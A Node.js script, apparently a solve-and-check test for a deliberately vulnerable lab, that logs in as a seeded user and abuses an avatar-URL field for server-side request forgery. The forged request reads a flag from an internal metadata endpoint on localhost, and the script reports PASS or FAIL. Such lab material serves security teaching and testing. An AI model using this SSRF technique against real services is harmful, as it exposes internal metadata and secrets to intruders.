#!/usr/bin/env node
/** V2.6 SSRF — fetch internal-metadata flag via avatar URL */
import { extractFlag } from '../../../packages/shared/dist/index.js';

function arg(name, fallback) {
  const i = process.argv.indexOf(`--${name}`);
  return i >= 0 ? process.argv[i + 1] : fallback;
}

const base = arg('base', 'http://127.0.0.1:3011').replace(/\/$/, '');
const metadata = arg('metadata', 'http://127.0.0.1:3099/flag');

const login = await fetch(`${base}/api/login`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: 'alice', password: 'alice123' }),
}).then((r) => r.json());

const res = await fetch(`${base}/api/profile/avatar`, {
  method: 'POST',
  headers: {
    Authorization: `Bearer ${login.token}`,
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ avatarUrl: metadata }),
});
const text = await res.text();
console.log('status', res.status);
console.log(text.slice(0, 400));
const flag = extractFlag(text);
if (res.status !== 200 || !flag) {
  console.error('FAIL: SSRF blocked or no flag');
  process.exit(1);
}
console.log('FLAG', flag);
console.log('PASS V2.6 SSRF');
